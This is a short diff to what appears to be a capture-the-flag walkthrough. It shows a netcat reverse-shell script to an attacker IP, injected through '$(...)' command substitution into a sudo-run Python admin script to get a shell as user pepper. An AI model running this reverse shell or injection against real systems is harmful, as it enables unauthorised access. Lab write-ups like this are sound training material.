@@ -332,7 +332,7 @@ the '$(...)' construct.
 ```bash
 export REVSHELL='/dev/shm/revshell.sh'
 echo 'nc -n 10.10.14.125 4338 -e /bin/bash' > $REVSHELL && chmod +x $REVSHELL
-echo '$('$REVSHELL')' | sudo -u pepper /var/www/Admin-Utilities/simpler.py
+echo '$('$REVSHELL')' | sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
 ```
 
 That should be enough to give us a reverse shell as user *pepper*. The next step is to head to */home/pepper* directory
